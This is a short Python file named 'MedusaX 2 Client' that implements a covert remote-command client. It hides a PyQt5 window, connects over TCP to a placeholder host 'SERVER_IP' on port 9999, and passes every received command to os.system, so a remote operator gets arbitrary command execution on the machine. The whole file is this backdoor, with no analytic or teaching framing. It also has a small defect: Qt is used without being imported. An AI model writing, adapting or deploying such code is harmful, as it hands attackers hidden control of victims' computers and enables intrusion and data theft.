import socket
import os
import sys
from PyQt5.QtWidgets import QApplication, QMainWindow

class HiddenWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('MedusaX 2 Client')
        self.setGeometry(100, 100, 800, 600)
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
        self.showFullScreen()
        self.hide()

def main():
    app = QApplication(sys.argv)
    window = HiddenWindow()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('SERVER_IP', 9999))

    while True:
        command = client.recv(1024).decode()
        if command == 'exit':
            break
        else:
            os.system(command)

    client.close()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
